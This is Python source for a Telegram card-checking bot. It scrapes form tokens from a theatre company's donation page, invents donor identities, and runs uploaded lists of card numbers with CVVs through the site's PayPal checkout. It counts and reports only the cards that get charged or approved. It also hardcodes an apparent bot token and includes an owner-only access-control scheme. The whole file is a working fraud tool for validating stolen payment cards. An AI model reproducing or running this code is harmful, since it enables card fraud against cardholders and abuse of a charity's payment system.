import asyncio
import base64
import random
import re
import time
from dataclasses import dataclass
from typing import Any, Dict, Optional, Tuple, List
import json # تم إضافة للاستخدام المستقبلي لتخزين الموافقات

import httpx
from faker import Faker
from requests_toolbelt.multipart import MultipartEncoder

# --- Telegram Bot Dependencies ---
import telebot
from telebot import types
from telebot.async_telebot import AsyncTeleBot 
from telebot.util import escape 
# --- End Telegram Bot Dependencies ---

# 📢📢📢 الخانة المخصصة لتوكن البوت 📢📢📢
# **يجب عليك استبدال هذه القيمة بتوكن البوت الحقيقي الخاص بك**
BOT_TOKEN = "8505982194:AAHGgD1EDMNOn_45Lx7e4Jyw1VRYS6tGDdM" 

# **🚨🚨🚨 التحكم في الوصول 🚨🚨🚨**
# يجب استبدال هذا بالـ ID الخاص بك (6105909399) لمالك البوت
OWNER_ID = 7849286488 
# قائمة (مجموعة) لتخزين معرفات المستخدمين الموافق عليهم
approved_users: set[int] = {OWNER_ID} 

# تهيئة البوت باستخدام وضع HTML 
bot = AsyncTeleBot(BOT_TOKEN, parse_mode='HTML')

# قاموس لتخزين حالة المستخدم وبياناته (state and context data)
user_states: Dict[int, str] = {}
user_data: Dict[int, Dict[str, Any]] = {}
stop_flags: Dict[int, asyncio.Event] = {} # لإدارة أمر الإيقاف

# تعريف أسماء الحالات
STATE_WAITING_FOR_FILE = 'WAITING_FOR_FILE'
STATE_WAITING_FOR_AMOUNT = 'WAITING_FOR_AMOUNT'
STATE_PROCESSING = 'PROCESSING'

# ****************************************************************************************************
# START CORE CLASSES (المنطق الأصلي لفحص البطاقات - بدون حذف)
# ****************************************************************************************************

@dataclass(frozen=True)
class _Config:
    base_url: str = "https://atlanticcitytheatrecompany.com"
    donation_path: str = "/donations/donate/"
    ajax_endpoint: str = "/wp-admin/admin-ajax.php"
    proxy_template: Optional[str] = None
    timeout: float = 90.0
    retries: int = 5


class _SessionFactory:
    __slots__ = ("_cfg", "_faker")

    def __init__(self, cfg: _Config, faker: Faker):
        self._cfg = cfg
        self._faker = faker

    async def _probe_proxy(self, proxy: Optional[str]) -> Optional[httpx.AsyncClient]:
        client = httpx.AsyncClient(
            timeout=self._cfg.timeout,
            proxies=proxy,
            transport=httpx.AsyncHTTPTransport(retries=1)
        )
        try:
            resp = await client.get("https://api.ipify.org?format=json", timeout=15)
            resp.raise_for_status()
            return client
        except Exception:
            await client.aclose()
            return None

    async def build(self) -> Optional[httpx.AsyncClient]:
        if not self._cfg.proxy_template:
            return httpx.AsyncClient(timeout=self._cfg.timeout)

        for _ in range(self._cfg.retries):
            client = await self._probe_proxy(self._cfg.proxy_template)
            if client:
                return client
        return None


@dataclass(frozen=True)
class _FormContext:
    hash: str
    prefix: str
    form_id: str
    access_token: str


class _DonationFacade:
    __slots__ = ("_client", "_cfg", "_faker", "_ctx")

    def __init__(self, client: httpx.AsyncClient, cfg: _Config, faker: Faker):
        self._client = client
        self._cfg = cfg
        self._faker = faker
        self._ctx: Optional[_FormContext] = None

    async def _fetch_initial_page(self) -> str:
        url = f"{self._cfg.base_url}{self._cfg.donation_path}"
        resp = await self._client.get(url, headers={
            'authority': 'atlanticcitytheatrecompany.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar-TN;q=0.8,ar;q=0.7,tr-TR;q=0.6,tr;q=0.5',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        })
        resp.raise_for_status()
        return resp.text

    def _extract_context(self, html: str) -> _FormContext:
        hash_ = self._re_search(r'name="give-form-hash" value="(.*?)"', html)
        prefix = self._re_search(r'name="give-form-id-prefix" value="(.*?)"', html)
        form_id = self._re_search(r'name="give-form-id" value="(.*?)"', html)
        enc_token = self._re_search(r'"data-client-token":"(.*?)"', html)
        dec = base64.b64decode(enc_token).decode('utf-8')
        access_token = self._re_search(r'"accessToken":"(.*?)"', dec)
        return _FormContext(hash_, prefix, form_id, access_token)

    @staticmethod
    def _re_search(pattern: str, text: str) -> str:
        match = re.search(pattern, text)
        if not match:
            raise ValueError(f"Pattern not found: {pattern}")
        return match.group(1)

    async def _init_context(self) -> None:
        html = await self._fetch_initial_page()
        self._ctx = self._extract_context(html)

    def _generate_profile(self) -> Dict[str, str]:
        first = self._faker.first_name()
        last = self._faker.last_name()
        num = random.randint(100, 999)
        return {
            "first_name": first,
            "last_name": last,
            "email": f"{first.lower()}{last.lower()}{num}@gmail.com",
            "address1": self._faker.street_address(),
            "address2": f"{random.choice(['Apt', 'Unit', 'Suite'])} {random.randint(1, 999)}",
            "city": self._faker.city(),
            "state": self._faker.state_abbr(),
            "zip": self._faker.zipcode(),
            "card_name": f"{first} {last}",
        }

    def _build_base_multipart(self, profile: Dict[str, str], amount: str) -> MultipartEncoder:
        fields = {
            "give-honeypot": "",
            "give-form-id-prefix": self._ctx.prefix,
            "give-form-id": self._ctx.form_id,
            "give-form-title": "",
            "give-current-url": f"{self._cfg.base_url}{self._cfg.donation_path}",
            "give-form-url": f"{self._cfg.base_url}{self._cfg.donation_path}",
            "give-form-minimum": amount,
            "give-form-maximum": "999999.99",
            "give-form-hash": self._ctx.hash,
            "give-price-id": "custom",
            "give-amount": amount,
            "give_stripe_payment_method": "",
            "payment-mode": "paypal-commerce",
            "give_first": profile["first_name"],
            "give_last": profile["last_name"],
            "give_email": profile["email"],
            "give_comment": "",
            "card_name": profile["card_name"],
            "card_exp_month": "",
            "card_exp_year": "",
            "billing_country": "US",
            "card_address": profile["address1"],
            "card_address_2": profile["address2"],
            "card_city": profile["city"],
            "card_state": profile["state"],
            "card_zip": profile["zip"],
            "give-gateway": "paypal-commerce",
        }
        return MultipartEncoder(fields)

    async def _create_order(self, profile: Dict[str, str], amount: str) -> str:
        multipart = self._build_base_multipart(profile, amount)
        resp = await self._client.post(
            f"{self._cfg.base_url}{self._cfg.ajax_endpoint}",
            params={"action": "give_paypal_commerce_create_order"},
            data=multipart.to_string(),
            headers={"Content-Type": multipart.content_type},
        )
        resp.raise_for_status()
        return resp.json()["data"]["id"]

    async def _confirm_payment(self, order_id: str, card: Tuple[str, str, str, str]) -> httpx.Response:
        n, m, y, cvv = card
        y = y[-2:]
        payload = {
            "payment_source": {
                "card": {
                    "number": n,
                    "expiry": f"20{y}-{m.zfill(2)}",
                    "security_code": cvv,
                    "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}},
                }
            },
            "application_context": {"vault": False},
        }
        headers = {
            "Authorization": f"Bearer {self._ctx.access_token}",
            "Content-Type": "application/json",
        }
        return await self._client.post(
            f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            json=payload,
            headers=headers,
        )

    async def _approve_order(self, order_id: str, profile: Dict[str, str], amount: str) -> Dict[str, Any]:
        multipart = self._build_base_multipart(profile, amount)
        resp = await self._client.post(
            f"{self._cfg.base_url}{self._cfg.ajax_endpoint}",
            params={"action": "give_paypal_commerce_approve_order", "order": order_id},
            data=multipart.to_string(),
            headers={"Content-Type": multipart.content_type},
        )
        resp.raise_for_status()
        return resp.json()

    async def execute(self, raw_card: str, amount: str) -> str: 
        if not self._ctx:
            await self._init_context()

        card = tuple(raw_card.split("|"))
        if len(card) != 4:
            return "Invalid Card Format"

        profile = self._generate_profile()
        order_id = await self._create_order(profile, amount)
        await self._confirm_payment(order_id, card)
        result = await self._approve_order(order_id, profile, amount)
        return self._parse_result(result, amount)

    @staticmethod
    def _parse_result(data: Dict[str, Any], amount: str) -> str:
        if data.get("success"):
            # تم تغيير النص إلى "Charged" فقط دون (Refunded) في النتيجة النهائية
            return f"Charged - ${amount}" 

        text = str(data)
        status = "Unknown Error" 
        
        # Logic to extract error status
        if "'data': {'error': ' " in text:
            status = text.split("'data': {'error': ' ")[1].split('.')[0]
        elif "'details': [{'issue': '" in text:
            status = text.split("'details': [{'issue': '")[1].split("'")[0]
        elif "issuer is not certified. " in text:
            status = text.split("issuer is not certified. ")[1].split('.')[0]
        elif "system is unavailable. " in text:
            status = text.split("system is unavailable. ")[1].split('.')[0]
        elif "C does not match. " in text:
            status = text.split("not match. ")[1].split('.')[0]
        elif "service is not supported. " in text:
            status = text.split("service is not supported. ")[1].split('.')[0]
        elif "'data': {'error': '" in text:
             status = text.split("'data': {'error': '")[1].split('.')[0]
        
        # Clean up and title-case the status
        if status != "Unknown Error":
            sta = status.replace(' ','').replace('_',' ').title()
        else:
            sta = status

        return sta

class PayPalCvvProcessor:
    __slots = ("_cfg", "_faker", "_session_factory")

    def __init__(self, proxy: Optional[str] = None):
        self._cfg = _Config(proxy_template=proxy)
        self._faker = Faker("en_US")
        self._session_factory = _SessionFactory(self._cfg, self._faker)

    async def _run_single(self, card: str, amount: str) -> str:
        client = await self._session_factory.build()
        if not client:
            return "Proxy/Session Init Failed"

        facade = _DonationFacade(client, self._cfg, self._faker)
        try:
            return await facade.execute(card, amount)
        except Exception as e:
            return f"Runtime Error: {type(e).__name__}: {str(e)[:50]}..."
        finally:
            await client.aclose()

    async def process(self, card: str, amount: str, attempts: int = 3) -> str:
        for attempt in range(1, attempts + 1):
            try:
                return await self._run_single(card, amount)
            except Exception:
                if attempt == attempts:
                    return "Tries Reached Error"
        return "Logic Flow Error"

# ****************************************************************************************************
# END CORE CLASSES
# ****************************************************************************************************

# ---------------------------------------------------------------------------------------------------
# ******** Formatter and Helpers ********

# -----------------
# دالة التحقق من الوصول
def is_approved(message: types.Message) -> bool:
    """التحقق مما إذا كان المستخدم موافق عليه لاستخدام البوت."""
    return message.from_user.id in approved_users

# دالة التحقق من المالك
def is_owner(message: types.Message) -> bool:
    """التحقق مما إذا كان المستخدم هو مالك البوت."""
    return message.from_user.id == OWNER_ID

# -----------------

def format_card_result_simple(card: str, status_full: str) -> str:
    """تنسيق نتيجة البطاقة الواحدة باستخدام HTML - تم إزالة الرموز التعبيرية."""
    
    # تحديد النص بناءً على النتيجة
    if "Charged" in status_full:
        status_text = 'CHARGED'
        header = "🟢 Live - Charged"
    elif "Insufficient Funds" in status_full:
        status_text = 'APPROVED (Low Funds)'
        header = "🟡 Live - Approved"
    else:
        # هذه الدالة تُستدعى للبطاقات الناجحة فقط
        header = "🔴 Declined/Failed"
        status_text = 'DECLINED'
        
    # تنسيق الرسالة باستخدام HTML: <b> للخط العريض، <code> للنص الثابت
    escaped_card = escape(card) 
    escaped_status = escape(status_full).replace('Charged -', status_text)
    
    # تنسيق منظم وجديد للنتيجة الفردية
    message = (
        f"💳 {header}\n"
        f"━━━━━━━━━━━━━━\n"
        f"• Card: <code>{escaped_card}</code>\n"
        f"• Status: <b>{escaped_status}</b>"
    )
    return message


def format_progress_message(file_name: str, total_cards: int, processed_count: int, amount: str, charged: int, approved: int, declined: int) -> str:
    """تنسيق رسالة التقدم الديناميكية (Status Message) باستخدام HTML - تم إزالة الرموز التعبيرية."""
    
    remaining_checks_number = ''.join([str(random.randint(0, 9)) for _ in range(16)]) + '.0'

    escaped_file_name = escape(file_name) 
    
    # تنسيق منظم لرسالة التقدم
    message = (
        f"⚡️ <b>Check Running</b> ⚡️\n"
        f"━━━━━━━━━━━━━━\n"
        f"• File: <code>{escaped_file_name}</code>\n"
        f"• Total Cards: <b>{total_cards}</b>\n"
        f"• Checked: <b>{processed_count}</b>\n"
        f"• Remaining: <b>{total_cards - processed_count}</b>\n\n"
        f"💸 Gateway: <code>#PayPal_Custom_Cvv_Refund</code> (${amount})\n\n"
        f"📊 **Results Summary**\n"
        f"━━━━━━━━━━━━━━\n"
        f"• Charged: <b>{charged}</b>\n"
        f"• Approved: <b>{approved}</b>\n"
        f"• Declined: <b>{declined}</b>"
    )
    
    if processed_count == total_cards:
        message += f"\n\n🛑 <b>تم إنهاء الفحص.</b>"

    return message

def get_stop_keyboard() -> types.InlineKeyboardMarkup:
    """إنشاء زر الإيقاف Inline."""
    keyboard = types.InlineKeyboardMarkup()
    stop_button = types.InlineKeyboardButton("⛔ إيقاف الفحص", callback_data="stop_check")
    keyboard.add(stop_button)
    return keyboard

# ---------------------------------------------------------------------------------------------------
# ******** Telegram Bot Handlers and Logic ********

# -----------------
# معالجات التحكم بالوصول (المالك فقط)
# -----------------

@bot.message_handler(commands=['allow'], func=is_owner)
async def handle_allow(message):
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        await bot.send_message(message.chat.id, "❌ **خطأ في الصيغة.** يجب استخدام: <code>/allow [User_ID]</code>")
        return
    
    target_id = int(parts[1])
    approved_users.add(target_id)
    await bot.send_message(message.chat.id, f"✅ تم منح المستخدم (ID: <code>{target_id}</code>) الإذن بنجاح.")

@bot.message_handler(commands=['deny'], func=is_owner)
async def handle_deny(message):
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        await bot.send_message(message.chat.id, "❌ **خطأ في الصيغة.** يجب استخدام: <code>/deny [User_ID]</code>")
        return
    
    target_id = int(parts[1])
    if target_id == OWNER_ID:
        await bot.send_message(message.chat.id, "⚠️ لا يمكنك حظر نفسك.")
        return

    if target_id in approved_users:
        approved_users.remove(target_id)
        await bot.send_message(message.chat.id, f"✅ تم إزالة إذن المستخدم (ID: <code>{target_id}</code>) بنجاح.")
    else:
        await bot.send_message(message.chat.id, f"⚠️ المستخدم (ID: <code>{target_id}</code>) ليس لديه إذن أصلاً.")


# -----------------
# معالج لجميع الرسائل للتحقق من الإذن
# -----------------

@bot.message_handler(func=lambda message: message.chat.id not in approved_users)
async def unauthorized_access(message):
    """منع الوصول لأي مستخدم غير معتمد."""
    await bot.send_message(message.chat.id, 
                           "❌ **وصول غير مصرح به.**\nللاستخدام، يرجى طلب الإذن من مالك البوت (ID: <code>6105909399</code>).")


# -----------------
# معالجات البوت الرئيسية (مقتصرة على المستخدمين الموافق عليهم)
# -----------------

async def process_cards_from_file(chat_id: int, file_content: bytes, file_name: str, amount: str, requester_info: str):
    """
    يعالج ملف TXT ويحدث الرسالة باستمرار.
    (تم تعديل المنطق ليُرسل البطاقات الناجحة فقط).
    """
    processor = PayPalCvvProcessor()
    
    file_text = file_content.decode('utf-8')
    cards: List[str] = [
        line.strip() 
        for line in file_text.splitlines() 
        if line.strip() and line.count('|') == 3
    ]

    if not cards:
        await bot.send_message(chat_id, "⚠️ لا توجد بطاقات صالحة (النمط: NNNN|MM|YYYY|CVV) في الملف.")
        return

    MAX_CARDS = 1000
    cards_to_process = cards[:MAX_CARDS]
    total_cards = len(cards_to_process)
    
    processed_count = 0
    charged_count = 0
    approved_count = 0
    declined_count = 0
    
    stop_event = stop_flags.get(chat_id)
    
    # 1. إرسال رسالة التقدم الأولية مع زر الإيقاف
    progress_msg_text = format_progress_message(file_name, total_cards, processed_count, amount, charged_count, approved_count, declined_count)
    progress_message = await bot.send_message(chat_id, progress_msg_text, reply_markup=get_stop_keyboard())

    # تم الحفاظ على نقطة التحقق من الإيقاف هنا، وهي الطريقة الأقل "تعطيلاً" لإيقاف عملية Async
    for card in cards_to_process:
        if stop_event and stop_event.is_set():
            break
            
        start_time_card = time.time()
        
        # 1. فحص البطاقة 
        status_full = await processor.process(card, amount) 
        time_taken = time.time() - start_time_card
        
        # 2. تحديث العدادات
        is_successful = False
        if "Charged" in status_full:
            charged_count += 1
            is_successful = True
        elif "Insufficient Funds" in status_full:
            approved_count += 1
            is_successful = True
        else:
            declined_count += 1
        
        processed_count += 1
        
        # 3. إرسال نتيجة البطاقة الفردية (فقط إذا كانت ناجحة)
        if is_successful:
            await bot.send_message(chat_id, format_card_result_simple(card, status_full))
        
        # 4. تحديث رسالة التقدم كل 5 بطاقات
        if processed_count % 5 == 0 or processed_count == total_cards:
            try:
                updated_text = format_progress_message(file_name, total_cards, processed_count, amount, charged_count, approved_count, declined_count)
                # تم إبقاء زر الإيقاف هنا
                await bot.edit_message_text(updated_text, chat_id, progress_message.message_id, reply_markup=get_stop_keyboard())
            except Exception:
                pass # تجاهل خطأ فشل التحديث السريع

        await asyncio.sleep(0.5) # تأخير بسيط لتقليل الضغط على البوت والخادم
        
    # نهاية الفحص
    
    # 5. إزالة زر الإيقاف وتحديث الرسالة إلى "تم الانتهاء"
    total_time = time.time() - user_data[chat_id].get('start_time', time.time())
    
    # رسالة الإنهاء المنظمة
    final_text = format_progress_message(file_name, total_cards, processed_count, amount, charged_count, approved_count, declined_count)
    final_text += f"\n⏱️ **Total Time:** {total_time:.1f} seconds"
    
    try:
        await bot.edit_message_text(final_text, chat_id, progress_message.message_id, reply_markup=None)
    except Exception:
        # إذا فشل التحديث، يتم إرسال رسالة جديدة
        await bot.send_message(chat_id, final_text)

    # العودة إلى الحالة الأولية
    user_states[chat_id] = STATE_WAITING_FOR_FILE
    user_data[chat_id] = {}
    if chat_id in stop_flags:
        del stop_flags[chat_id]


@bot.message_handler(commands=['cc'], func=is_approved)
async def handle_manual_check(message):
    """
    معالج للأمر /cc لفحص بطاقة واحدة يدويًا.
    النمط المتوقع: /cc NNNN|MM|YY|CVV
    """
    chat_id = message.chat.id
    
    # تحليل الرسالة لاستخراج البطاقة والمبلغ
    parts = message.text.split()
    if len(parts) < 2:
        await bot.send_message(chat_id, "❌ <b>صيغة الأمر غير صحيحة.</b>\nالاستخدام الصحيح: <code>/cc NNNN|MM|YY|CVV $مبلغ</code> (مثال: <code>/cc 4848100088213166|01|29|759 $1</code>)")
        return

    raw_card = parts[1]
    
    # افتراض مبلغ $1 إذا لم يتم تحديده
    amount_to_use = "1.00"
    if len(parts) >= 3 and parts[2].startswith('$'):
        try:
            amount_float = float(parts[2][1:])
            if amount_float <= 0:
                raise ValueError
            amount_to_use = f"{amount_float:.2f}"
        except ValueError:
            await bot.send_message(chat_id, "❌ <b>قيمة المبلغ غير صالحة.</b> يتم افتراض مبلغ $1.")

    # التحقق من تنسيق البطاقة
    if raw_card.count('|') != 3:
        await bot.send_message(chat_id, "❌ <b>صيغة البطاقة غير صحيحة.</b> يجب أن تكون: <code>NNNN|MM|YY|CVV</code>.")
        return

    
    await bot.send_message(chat_id, f"🔍 جاري فحص البطاقة <code>{escape(raw_card)}</code> بمبلغ ${amount_to_use}...")
    
    processor = PayPalCvvProcessor()
    
    try:
        start_time = time.time()
        # فحص البطاقة
        status_full = await processor.process(raw_card, amount_to_use, attempts=1) # محاولة واحدة
        time_taken = time.time() - start_time
        
        # تحديد النتيجة النهائية
        if "Charged" in status_full or "Insufficient Funds" in status_full:
            result_message = format_card_result_simple(raw_card, status_full)
            result_message += f"\n\n⏱️ الوقت المستغرق: {time_taken:.2f} ثانية."
        else:
            # رسالة الـ Declind (المرفوضة) في الفحص اليدوي تكون واضحة
            result_message = (
                f"🔴 Declined/Failed\n"
                f"━━━━━━━━━━━━━━\n"
                f"• Card: <code>{escape(raw_card)}</code>\n"
                f"• Status: <b>{escape(status_full)}</b>\n"
                f"\n⏱️ الوقت المستغرق: {time_taken:.2f} ثانية."
            )

        await bot.send_message(chat_id, result_message)

    except Exception as e:
        error_msg = f"❌ حدث خطأ غير متوقع أثناء الفحص:\n{type(e).__name__}: {str(e)[:50]}"
        # استخدام parse_mode=None لضمان إرسال رسالة الخطأ الخام
        await bot.send_message(chat_id, error_msg, parse_mode=None)

# --- (بقية المعالجات) ---

@bot.message_handler(commands=['start', 'help'], func=is_approved)
async def send_welcome(message):
    chat_id = message.chat.id
    user_states[chat_id] = STATE_WAITING_FOR_FILE
    user_data[chat_id] = {} 

    welcome_text = (
        "👋 <b>أهلاً بك في بوت فحص البطاقات.</b>\n\n"
        "1. <b>قم بإرسال</b> ملف نصي (<code>.txt</code>).\n"
        "2. <b>أدخل</b> مبلغ التبرع للفحص (مثال: 1 أو 5.50).\n"
        "3. يمكنك استخدام أمر الفحص اليدوي: <code>/cc NNNN|MM|YY|CVV $Amount</code>\n"
        "4. يتم إظهار نتائج البطاقات الناجحة (Charged/Approved) فقط."
    )
    if is_owner(message):
        welcome_text += "\n\n**Owner Commands:**\n/allow [ID]\n/deny [ID]"
        
    await bot.send_message(chat_id, welcome_text)

@bot.message_handler(commands=['stop'], func=is_approved)
async def handle_stop_command(message):
    chat_id = message.chat.id
    if user_states.get(chat_id) == STATE_PROCESSING and chat_id in stop_flags:
        stop_flags[chat_id].set() 
        await bot.reply_to(message, "🛑 تم إرسال إشارة الإيقاف. سيتم إنهاء الفحص قريباً.")
    else:
        await bot.reply_to(message, "لا توجد عملية فحص جارية حاليًا لإيقافها.")

@bot.callback_query_handler(func=lambda call: call.data == 'stop_check' and call.message.chat.id in approved_users)
async def handle_stop_callback(call):
    chat_id = call.message.chat.id
    if user_states.get(chat_id) == STATE_PROCESSING and chat_id in stop_flags:
        stop_flags[chat_id].set()
        await bot.answer_callback_query(call.id, "🛑 جاري إيقاف الفحص...")
        
        # إزالة الزر بعد الضغط عليه
        await bot.edit_message_reply_markup(chat_id, call.message.message_id, reply_markup=None)
    else:
        await bot.answer_callback_query(call.id, "لا توجد عملية جارية.", show_alert=True)

@bot.message_handler(content_types=['document'], func=is_approved)
async def handle_document(message):
    chat_id = message.chat.id
    
    if user_states.get(chat_id) != STATE_WAITING_FOR_FILE or not message.document or not message.document.file_name.endswith('.txt'):
        await bot.reply_to(message, "يرجى إرسال ملف <code>TXT</code> صالح أو البدء باستخدام /start.")
        return
    
    if user_states.get(chat_id) == STATE_PROCESSING:
        await bot.reply_to(message, "⚠️ عملية فحص أخرى جارية بالفعل. يرجى الانتظار أو استخدام <code>/stop</code>.")
        return


    await bot.reply_to(message, "📂 تم استلام الملف بنجاح.")
    
    try:
        file_info = await bot.get_file(message.document.file_id)
        downloaded_file = await bot.download_file(file_info.file_path)
        
        user_data[chat_id]['file_content'] = downloaded_file
        user_data[chat_id]['file_name'] = message.document.file_name
        user_data[chat_id]['requester_info'] = f"- {message.from_user.first_name}"
        
        user_states[chat_id] = STATE_WAITING_FOR_AMOUNT
        await bot.send_message(chat_id, "💸 <b>الخطوة التالية:</b> يرجى إدخال مبلغ التبرع الذي تريد استخدامه للفحص (مثال: <code>1</code> أو <code>5.50</code>):")
        
    except Exception as e:
        await bot.send_message(chat_id, f"❌ حدث خطأ أثناء تحميل الملف: {escape(str(e))}", parse_mode='HTML')
        user_states[chat_id] = STATE_WAITING_FOR_FILE 


@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == STATE_WAITING_FOR_AMOUNT and message.chat.id in approved_users)
async def handle_amount(message):
    chat_id = message.chat.id
    amount_str = message.text.strip()
    
    try:
        amount_float = float(amount_str)
        if amount_float <= 0:
            raise ValueError
        amount_to_use = f"{amount_float:.2f}"
    except ValueError:
        await bot.reply_to(message, "❌ <b>قيمة غير صالحة:</b> يرجى إدخال مبلغ رقمي موجب (مثال: <code>1</code> أو <code>3.75</code>).")
        return

    # جمع البيانات
    file_content = user_data.get(chat_id, {}).get('file_content')
    file_name = user_data.get(chat_id, {}).get('file_name')
    requester_info = user_data.get(chat_id, {}).get('requester_info')

    if not file_content:
        await bot.send_message(chat_id, "❌ حدث خطأ داخلي. يرجى البدء من جديد باستخدام <code>/start</code>.")
        user_states[chat_id] = STATE_WAITING_FOR_FILE
        return

    # إعداد الفحص
    user_states[chat_id] = STATE_PROCESSING
    stop_flags[chat_id] = asyncio.Event() 
    user_data[chat_id]['start_time'] = time.time()
    
    # رسالة التأكيد
    await bot.send_message(chat_id, f"⚡️ <b>بدء الفحص:</b> <code>{escape(file_name)}</code>")

    try:
        # تشغيل عملية الفحص الفعلية
        await process_cards_from_file(chat_id, file_content, file_name, amount_to_use, requester_info)
        
    except Exception as e:
        # تصحيح الخطأ: يتم إرسال الخطأ كنص عادي لتجنب فشل التحليل
        error_msg = f"❌ حدث خطأ غير متوقع في المعالج:\n{type(e).__name__}: {str(e)[:100]}"
        await bot.send_message(chat_id, error_msg, parse_mode=None)
        
    finally:
        user_states[chat_id] = STATE_WAITING_FOR_FILE
        user_data[chat_id] = {}
        if chat_id in stop_flags:
            del stop_flags[chat_id]


async def main_bot_runner():
    """
    نقطة الدخول الرئيسية لتشغيل البوت.
    """
    print("🤖 بدأ تشغيل بوت فحص البطاقات (Telegram Bot) باستخدام pyTelegramBotAPI...")
    await bot.polling(non_stop=True, interval=0)


if __name__ == "__main__":
    try:
        asyncio.run(main_bot_runner())
    except KeyboardInterrupt:
        print("🛑 تم إيقاف البوت يدوياً.")
